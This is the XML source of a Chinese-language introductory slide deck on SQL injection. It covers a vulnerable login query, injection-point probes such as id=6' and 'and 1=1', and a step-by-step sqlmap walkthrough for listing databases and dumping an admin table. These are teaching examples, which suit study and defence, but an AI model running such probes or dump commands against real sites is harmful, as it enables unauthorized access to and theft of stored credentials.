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54pt" style:font-size-asian="54pt" style:font-size-complex="5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 text:style-name="P1"><text:span text:style-name="T1">初识</text:span><text:span text:style-name="T1">SQL</text:span><text:span text:style-name="T1">注入</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P2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目录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什么是SQL？</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>什么是SQL注入？</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>栗子</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>怎么寻找注入点？</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>常见web环境总结</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>SQL注入神器sqlmap的简单介绍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什么是SQL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结构化查询语言(Structured Query Language)简称SQL</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>SQL是关系式数据库管理系统的标准语言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什么是SQL注入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通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>如果网站存在SQL注入漏洞，那么网站数据库中的数据可以任由攻击者查看和修改。查看管理员表获取账号密码最终获得管理员权限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栗子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后端脚本处理登录表单的SQL语句大致如此：</text:p>
                <text:p><text:span text:style-name="T2">select * from admin where username = ‘$username’;</text:span></text:p>
                <text:p><text:span text:style-name="T2">select * from admin where password = ‘$password’;</text:span></text:p>
                <text:p><text:s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怎么寻找注入点？</text:p>
              </text:list-header>
            </text:list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产生SQL注入的两个要素：</text:p>
                <text:p>1.必须有参数传递</text:p>
                <text:p>2.参数值带入数据库查询并执行</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>(数字型)注入点大概长这样：</text:p>
                <text:p>www.test.com/test.php?id=6</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>判断是否有注入点：</text:p>
                <text:p><text:span text:style-name="T2">www.test.com/test.php?id=6’(</text:span><text:span text:style-name="T2">回显错误</text:span></text:p>
                <text:p><text:span text:style-name="T2">www.test.com/test.php?id=6 and 1=1(</text:span><text:span text:style-name="T2">回显正确</text:span></text:p>
                <text:p><text:span text:style-name="T2">www.test.com/test.php?id=6 and 1=2(</text:span><text:span text:style-name="T2">回显错误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常见web环境总结</text:p>
              </text:list-header>
            </text:list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SP + Access/SQL sever + IIS</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>PHP + MySQL + Apache</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>JAVA + Oracle/MySQL/SQL sever + tomcat</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>ASP.NET + SQL sever + I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SQL注入神器sqlmap的简单介绍</text:p>
              </text:list-header>
            </text:list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常用参数介绍：</text:p>
              </text:list-header>
              <text:list-item>
                <text:p>-u<text:tab/>URL</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>--dbs<text:tab/><text:tab/>数据库</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>--tables<text:tab/><text:tab/>表</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>--columns<text:tab/><text:tab/>字段</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>--dump<text:tab/><text:tab/>拖库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SQL注入神器sqlmap的简单介绍</text:p>
              </text:list-header>
            </text:list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qlmap -u ‘www.test.com/test.php?id=6’</text:p>
                <text:p>判断URL是否存在注入点，如果有注入点，就会显示web容器和数据库版本信息</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>sqlmap -u ‘www.test.com/test.php?id=6‘ --dbs</text:p>
                <text:p>查询库（假设查到一个userinfo库。另外Access没有库，所以没有这步）</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>sqlmap -u ‘www.test.com/test.php?id=6’ -D userinfo -–tables</text:p>
                <text:p>在userinfo库中查询表段（假设查到一个admin表）</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>sqlmap -u ‘www.test.com/test.php?id=6’ -D userinfo -T admin –-columns</text:p>
                <text:p>在userinfo库的admin表中查询字段</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>sqlmap -u ‘www.test.com/test.php?id=6’ -D userinfo -T admin –C –-dump</text:p>
                <text:p>导出查询到的所有字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8" draw:text-style-name="P4" draw:layer="layout" svg:width="13cm" svg:height="6cm" svg:x="7.5cm" svg:y="7.5cm" presentation:class="title">
          <draw:text-box>
            <text:p text:style-name="P4"><text:span text:style-name="T3">TH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1T17:39:50.823845939</meta:creation-date>
    <meta:editing-duration>PT18M9S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/5.4.3.2$Linux_X86_64 LibreOffice_project/40m0$Build-2</meta:generator>
    <dc:date>2017-12-21T21:26:32.447747298</dc:date>
    <meta:document-statistic meta:object-count="8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